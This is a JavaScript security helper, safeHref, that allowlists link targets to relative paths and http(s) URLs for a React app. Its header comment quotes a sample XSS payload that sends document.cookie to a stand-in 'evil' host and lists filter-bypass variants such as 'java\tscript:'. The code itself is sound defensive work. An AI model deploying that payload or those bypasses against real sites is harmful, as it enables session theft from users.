// lib/security/safeHref.js
// Scheme/relative-path allowlist for hrefs built from DB/LLM/user data (audit #4, #11).
//
// React does NOT block `javascript:` hrefs (it only warns in dev), so a body link like
// `[x](javascript:fetch('//evil/'+document.cookie))` becomes a working XSS vector. This
// returns the URL string only if it is safe to place in an <a href>, else null. Callers
// render the link's label as PLAIN TEXT (no <a>) when this returns null.
//
// Safe =
//   - a same-site relative path beginning with a single "/" (NOT "//", which is a
//     protocol-relative URL to another host, and NOT "/\" which browsers treat as "//"), OR
//   - an absolute URL whose protocol is exactly http: or https:.
//
// Rejected: javascript:, JavaScript:, " javascript:" (leading whitespace), "java\tscript:"
// (embedded control char), data:, vbscript:, mailto: and every other scheme, and
// protocol-relative "//host". Any control char (incl. tab/newline) anywhere -> reject.
export function safeHref(raw) {
  if (typeof raw !== 'string') return null;
  // Any C0 control char or DEL anywhere (e.g. the "java\tscript:" bypass) -> reject outright.
  if (/[\u0000-\u001F\u007F]/.test(raw)) return null;

  const s = raw.trim();
  if (!s) return null;

  // Same-site relative path: exactly one leading slash.
  if (s[0] === '/') {
    if (s[1] === '/' || s[1] === '\\') return null; // "//host" / "/\host" -> off-site
    return s;
  }

  // Absolute URL: must parse and be http(s). `new URL` lowercases the protocol, so a
  // mixed-case scheme ("JavaScript:") is normalized and still rejected here.
  let u;
  try { u = new URL(s); } catch { return null; }
  if (u.protocol === 'http:' || u.protocol === 'https:') return s;
  return null;
}
